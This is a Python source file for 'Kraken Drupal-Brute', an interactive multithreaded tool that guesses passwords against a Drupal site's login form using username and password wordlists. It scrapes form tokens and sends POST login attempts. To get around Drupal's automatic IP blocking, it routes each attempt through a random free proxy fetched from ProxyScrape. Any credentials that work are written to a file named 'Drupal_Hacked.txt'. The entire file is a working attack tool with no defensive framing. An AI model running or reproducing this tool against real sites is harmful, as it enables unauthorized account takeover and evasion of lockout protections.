import os
import sys
import time
import re
import requests
import logging
from colorama import Fore, Style, init
from random import choice
import pyfiglet
from threading import Thread, Lock
from queue import Queue


init(autoreset=True)


logging.basicConfig(filename=os.path.join('Logs', 'drupal_brute.log'),
                    level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


script_dir = os.path.dirname(os.path.realpath(__file__))
results_dir = os.path.join(script_dir, 'Results')
logs_dir = os.path.join(script_dir, 'Logs')
wordlists_dir = os.path.join(script_dir, "..", "wordlists")


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


output_lock = Lock()

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken Drupal-Brute", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def status(msg):
    """Prints status messages."""
    with output_lock:
        print(Fore.CYAN + "[*] " + msg)

def success(msg):
    """Prints success messages."""
    with output_lock:
        print(Fore.GREEN + "[+] " + msg)

def error(msg):
    """Prints error messages."""
    with output_lock:
        print(Fore.RED + "[-] " + msg)

def fetch_proxies():
    """Fetch proxies from ProxyScrape."""
    status("Fetching proxies from ProxyScrape...")
    url = 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&proxy_format=protocolipport&format=text'
    try:
        response = requests.get(url)
        proxies = response.text.splitlines()
        success(f"Fetched {len(proxies)} proxies from ProxyScrape.")
        return [{"http": f"http://{proxy}", "https": f"http://{proxy}"} for proxy in proxies]
    except Exception as e:
        error(f"Failed to fetch proxies: {e}")
        sys.exit(1)

class DrupalBruteForce:
    def __init__(self):
        clear_console()
        display_banner()

        self.site, self.usernames, self.passwords, self.num_threads = self.get_user_input()
        self.proxy_list = self.get_proxies()
        self.queue = Queue()
        self.threads = []
        self.total_attempts = len(self.usernames) * len(self.passwords)
        self.attempt_number = 0

        
        for username in self.usernames:
            for password in self.passwords:
                self.queue.put((username, password))

        
        for _ in range(self.num_threads):
            t = Thread(target=self.worker)
            t.start()
            self.threads.append(t)

        
        self.queue.join()

        success("[Completed] All password attempts finished.")

    def get_user_input(self):
        """Gathers user input for the Drupal brute force operation."""
        site = input(Fore.WHITE + '[i] Enter the target: ').strip()
        if not site.startswith(('http://', 'https://')):
            site = 'http://' + site
        site = site.rstrip('/')

        use_username_list = input(Fore.WHITE + "[i] Use username list? (Y/n): ").strip().lower()
        if use_username_list != 'n':
            user_file = input(Fore.WHITE + "[i] Username list (default: users.txt, press Enter for default): ").strip() or os.path.join(wordlists_dir, "users.txt")
            status(f"Loading usernames from {user_file}...")
            if not os.path.isfile(user_file):
                error(f"Username list not found: {user_file}")
                logging.error(f"Username list not found: {user_file}")
                sys.exit(1)
            with open(user_file, 'r', encoding='utf-8') as f:
                usernames = [line.strip() for line in f if line.strip()]
            if not usernames:
                error("No usernames found in the list.")
                logging.error("No usernames found.")
                sys.exit(1)
            success(f"{len(usernames)} usernames loaded from the list.")
        else:
            username = input(Fore.WHITE + "[i] Enter username: ").strip()
            if not username:
                error("No username provided.")
                logging.error("No username provided.")
                sys.exit(1)
            usernames = [username]
            success(f"Username entered manually: {username}")

        passwordlist = input(Fore.WHITE + "[i] Password list (default: passwords.txt, press Enter for default): ").strip() or os.path.join(wordlists_dir, "passwords.txt")
        status(f"Loading passwords from {passwordlist}...")
        if not os.path.isfile(passwordlist):
            error(f"Password list not found: {passwordlist}")
            logging.error(f"Password list not found: {passwordlist}")
            sys.exit(1)
        with open(passwordlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        success(f"{len(passwords)} passwords loaded.")

        num_threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10, press Enter for default): ") or 10)

        status("All inputs received successfully.")
        print(Fore.YELLOW + "-"*60)
        print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
        return site, usernames, passwords, num_threads

    def get_proxies(self):
        """Ask user to choose proxy fetching method or input proxy list manually."""
        print(Fore.RED + "Note: Drupal blocks IP addresses automatically after too many failed login attempts.")
        use_proxy = input(Fore.WHITE + "[i] Do you want to fetch proxies from ProxyScrape (Y/n)? ").strip().lower()

        if use_proxy != 'n':
            return fetch_proxies()
        else:
            proxy_file = input(Fore.WHITE + "[i] Enter proxy list file path: ").strip()
            if not os.path.isfile(proxy_file):
                error(f"Proxy list file not found: {proxy_file}")
                logging.error(f"Proxy list file not found: {proxy_file}")
                sys.exit(1)
            with open(proxy_file, 'r', encoding='utf-8') as f:
                proxies = [line.strip() for line in f if line.strip()]
            success(f"Loaded {len(proxies)} proxies from {proxy_file}.")
            return [{"http": f"http://{proxy}", "https": f"http://{proxy}"} for proxy in proxies]

    def worker(self):
        """Thread worker function to process the queue."""
        while not self.queue.empty():
            username, password = self.queue.get()
            self.drupal(username, password)
            self.queue.task_done()

    def drupal(self, username, password):
        """Attempts to log in to the Drupal site using provided credentials."""
        try:
            proxy = choice(self.proxy_list)  

            sess = requests.session()

            
            response = sess.get(f'{self.site}/user/login', timeout=10, proxies=proxy)

            
            form_build_id_match = re.search(r'name="form_build_id" value="(.+?)"', response.text)
            form_build_id = form_build_id_match.group(1) if form_build_id_match else ''

            form_id_match = re.search(r'name="form_id" value="(.+?)"', response.text)
            form_id = form_id_match.group(1) if form_id_match else 'user_login_form'

            post_data = {
                'name': username,
                'pass': password,
                'form_build_id': form_build_id,
                'form_id': form_id,
                'op': 'Log in'
            }

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            self.attempt_number += 1  

            
            response = sess.post(f'{self.site}/user/login', data=post_data, headers=headers, timeout=10, proxies=proxy)

            
            if 'Log out' in response.text or 'My account' in response.text:
                success_msg = (
                    f"\n[{self.attempt_number}/{self.total_attempts}] Tested - {username}:{password}\n"
                    f"\n{Fore.GREEN + Style.BRIGHT}SUCCESS!{Style.RESET_ALL} Valid credentials found!\n"
                    f"{Fore.YELLOW}{'-'*40}\n"
                    f"URL: {Fore.CYAN}{self.site}/user/login{Style.RESET_ALL}\n"
                    f"Username: {Fore.YELLOW}{username}{Style.RESET_ALL}\n"
                    f"Password: {Fore.YELLOW}{password}{Style.RESET_ALL}\n"
                    f"{Fore.YELLOW}{'-'*40}\n"
                )
                sys.stdout.write('\033[K')  
                print(success_msg)
                with open(os.path.join(results_dir, 'Drupal_Hacked.txt'), 'a') as writer:
                    writer.write(success_msg)
            else:
                with output_lock:
                    sys.stdout.write(f'\r[{self.attempt_number}/{self.total_attempts}] Tested - Current: {username}:{password}')
                    sys.stdout.flush()

        except Exception as e:
            logging.error(f"Login attempt error: {str(e)}")
            error(f"Login attempt error: {str(e)}")

def main():
    try:
        DrupalBruteForce()
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
        print(Fore.YELLOW + "Script interrupted by user.")

if __name__ == '__main__':
    main()
